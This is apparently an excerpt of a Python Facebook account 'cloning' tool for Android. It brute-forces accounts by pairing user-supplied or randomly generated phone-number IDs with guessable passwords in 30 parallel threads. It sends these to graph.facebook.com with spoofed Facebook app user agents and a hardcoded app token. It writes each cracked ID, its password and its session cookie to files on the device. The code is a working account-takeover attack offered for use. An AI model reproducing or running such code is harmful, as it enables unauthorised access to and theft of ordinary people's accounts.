...
##------------(LOGO)------------##  
logo=(f"""{A}
{A} .d8888b.           888      d8b 888      
{G} d88P  Y88b          888      Y8P 888      
{A} Y88b.               888          888      
{G} "Y888b.    8888b.  888  888 888 88888b.  
{G}   "Y88b.     "88b 888 .88P 888 888 "88b 
{A}    "888 .d888888 888888K  888 888  888 
{G} Y88b  d88P 888  888 888 "88b 888 888 d88P 
{A} "Y8888P"  "Y888888 888  888 888 88888P"
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}❲{G}~{R}❳{G} DEVELOPER  {R}●{G}   SAKIB_🖤🖤
{R}❲{G}~{R}❳{G} VERSION    {R}●{G}   T-1.5
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def Main_SAKIB():
        ...
        if opt1 == "1": file()   
            ...
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_SAKIB()
            if d == '0':Main_SAKIB()
            else:linex();print(f'{R}❲{G}~{R}❳{G}  Selected Wrong Option ');time.sleep(2);Main_SAKIB()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}SAKIB.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    with tred(max_workers=30) as SAKIB:
        clear()
        tl = str(len(fo))
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                SAKIB.submit(api1,ids,names,passlist)
            elif methd =='2':
                SAKIB.submit(api2,ids,names,passlist)
            else:
                SAKIB.submit(api1,ids,names,passlist)
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/SAKIB_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    os.system('python Main_SAKIB.py')
...
def bd():
                ...
                with tred(max_workers=30) as SAKIB:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'mababa','i love you','sakil','saiful','jannnat','Fatema','arafat','mimmim','sabbir','aaabbb','free fire','Bangla','Bangladesh','bangladesh']
                                SAKIB.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}●{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/SAKIB_M1_FILE_OK.txt")
...
def gmail():
                ...
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}●{G} Rakib {R}|{G} Sakib {R}|{G} Ariyan {R}|{G} Maruf');linex()
...
def sexx():
	en = random.choice(['en_US','en_GB','ar_AR','bg_BG','id_ID','th_TH','en_BD','pt_PT','el_GR'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','BD airtel','Nepal Telecom','Banglalink'])
	...
	el = "[FBAN/FB4A;FBAV/138.0.0.71.54;FBBV/532394806;FBRV/0;FBPN/"+kt+";FBLC/"+en+";FBMF/RMX3195;FBBD/RMX3195;FBDV/Realme;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	by = "Dalvik/2.1.0 (Linux; U; Android 6; Oppo Build/MT9ENN) [FBAN/FB4A;FBAV/148.0.0.62.30;FBBV/544010822;FBRV/0;FBPN/com.facebook.katana;FBLC/it_IT;FBMF/A52;FBBD/A52;FBDV/Oppo;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	ff = "Dalvik/2.1.0 (Linux; U; Android 8; Samsung Build/OPD2.490287.088) [FBAN/FB4A;FBAV/145.0.0.93.86;FBBV/381463984;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Galaxy S23 FE;FBBD/Galaxy S23 FE;FBDV/Samsung;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	gp = "Dalvik/2.1.0 (Linux; U; Android 8; Motorola Build/OPD3.807963.052) [FBAN/FB4A;FBAV/400.0.0.96.58;FBBV/644751920;FBRV/0;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/Edge 40;FBBD/Edge 40;FBDV/Motorola;FBSV/8;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	hc = "Dalvik/2.1.0 (Linux; U; Android 6; Poco Build/MZTKK4) [FBAN/FB4A;FBAV/391.0.0.81.80;FBBV/770349622;FBRV/0;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/X5 pro;FBBD/X5 pro;FBDV/Poco;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	kk = "Dalvik/2.1.0 (Linux; U; Android 7; Xiaomi Build/NZVY1X) [FBAN/FB4A;FBAV/211.0.0.27.49;FBBV/105006102;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Redmi Note 12 4G;FBBD/Redmi Note 12 4G;FBDV/Xiaomi;FBSV/7;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"	
...
def sexy():
    ...
    END = '[FBAN/FB4A;FBAV/31.0.0.2367;FBBV/66412457;[FBAN/FB4A;FBAV/379.0.0.24.109;FBBV/20748054;FBDM/{density=2.15,width=720,height=1280};FBLC/lv_LV;FBCR/Bite Latvia (GSM);FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A9100;FBSV/8.0.0;nullFBCA/armeabi-v7a:armeabi;]'
...
def SAKIB():
	en = random.choice(['en_US','en_GB','ar_AR','bg_BG','id_ID','th_TH','en_BD','pt_PT','el_GR'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','airtel','Nepal Telecom','Banglalink','Grameenphone','Robi'])
	sd= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	el = "[FBAN/FB4A;FBAV/427.0.0.31.63;FBBV/444411021;FBDM/{density=2.75,width=1080,height=2030};FBLC/"+en+";FBRV/155327069;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/"+kt+";FBDV/Redmi Note 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	kd1 = "Dalvik/2.1.0 (Linux; U; Android 13; oppo Build/TQ1A.857859.053) [FBAN/FB4A;FBAV/441.0.0.54.68;FBBV/528101762;FBRV/0;FBPN/com.facebook.katana;FBLC/bg_BG;FBMF/A16;FBBD/A16;FBDV/oppo;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	kd2 = "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Build/TD1A.832902.015) [FBAN/FB4A;FBAV/228.0.0.81.43;FBBV/697419167;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/12;FBBD/12;FBDV/Redmi;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	kd3 = "Dalvik/2.1.0 (Linux; U; Android 12; Realme Build/SQ1D.677027.091) [FBAN/FB4A;FBAV/288.0.0.42.30;FBBV/298951604;FBRV/0;FBPN/com.facebook.katana;FBLC/it_IT;FBMF/C55;FBBD/C55;FBDV/Realme;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	kd4 = "Dalvik/2.1.0 (Linux; U; Android 13; Infinix Build/TD1A.196486.082) [FBAN/FB4A;FBAV/143.0.0.78.97;FBBV/334372548;FBRV/0;FBPN/com.facebook.katana;FBLC/fa_IR;FBMF/Hot 10;FBBD/Hot 10;FBDV/Infinix;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	kd5 = "Dalvik/2.1.0 (Linux; U; Android 12; VIVO Build/SD2A.834377.051) [FBAN/FB4A;FBAV/299.0.0.88.68;FBBV/565217219;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/v2029;FBBD/v2029;FBDV/VIVO;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"	
	ua = sd + el + kd1 + kd2 + kd3 + kd4 + kd5	
	return ua
##-----------GMAIL&RANDOM METHOD---------## 
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}SAKIB-XD{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                head = {'User-Agent':SAKIB(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                ...
                if 'session_key' in po:
                        ...
                        print(f'\r{R}❲{G}SAKIB-OK{R}❳{G} '+uid+f' {R}●{G} '+pas)
                        print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'SAKIB-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'SAKIB-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}SAKIB-CP{R}❳{Y} '+uid+f' {R}●{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'SAKIB-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}SAKIB-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}❲{G}SAKIB-OK{R}❳{G} '+uid+f' {R}●{G} '+pas)
                    print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'SAKIB-FILE-M1-OK.txt')
                    open('/sdcard/SAKIB/SAKIB-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}SAKIB-CP{R}❳{Y} '+uid+f' {R}●{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'SAKIB-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}SAKIB-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}SAKIB-OK{R}❳ '+uid+f' {R}●{G} '+pas)
                    print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'SAKIB-FILE-M2-OK.txt')
                    open('/sdcard/SAKIB/SAKIB-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}SAKIB-CP{R}❳{Y} '+uid+f' {R}●{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'SAKIB-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
